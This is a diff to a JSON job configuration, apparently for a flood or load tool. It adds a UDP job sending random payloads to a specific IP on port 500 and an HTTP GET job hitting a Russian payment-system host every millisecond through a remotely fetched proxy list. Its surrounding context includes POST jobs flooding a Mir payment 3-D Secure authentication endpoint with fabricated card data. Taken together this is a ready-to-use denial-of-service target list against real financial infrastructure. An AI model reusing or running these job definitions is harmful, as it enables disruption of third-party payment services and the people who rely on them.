@@ -26,10 +26,32 @@
       }
     },
     {
+      "type": "udp",
+      "count": 2,
+      "args": {
+        "address": "77.247.242.173:500",
+        "interval_ms": 100,
+        "body": "{{ random_payload 128 }}"
+      }
+    },
+    {
       "type": "http",
       "count": 10,
       "args": {
         "method": "GET",
+        "path": "https://dev.nspk.ru:443/",
+        "interval_ms": 1,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/proxylist.json\" }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "count": 10,
+      "args": {
+        "method": "POST",
         "path": "https://ds1.mirconnect.ru:443/sc1/authreq",
         "body": "version=3.0&pan=YWFhYWFhYWE=&expiry=YWFhYWFhYQ==&deviceCategory=0&purchAmount=100&purchaseDate=20220308+14:11:11&exponent=2&description=aaaaa&currency=643&merchantID=wildberries&merchantCountry=643&xid=MTIzNDEyMzQzMjE0&recurFreq=&recurEnd=&installments=&okUrl=https://ds1.mirconnect.ru/vbv/pareq&failUrl=https://ds1.mirconnect.ru/vbv/pareq&merchantName=wildberries&acqBIN=546901&merchantUrl=http://wildberries.ru/&dsMerchantId=20000000&utid=14999999&digest=YWFhYWFhYWFhYWFh&lastEventGmtTime=2022-03-08+14:11:11.123",
         "interval_ms": 1,
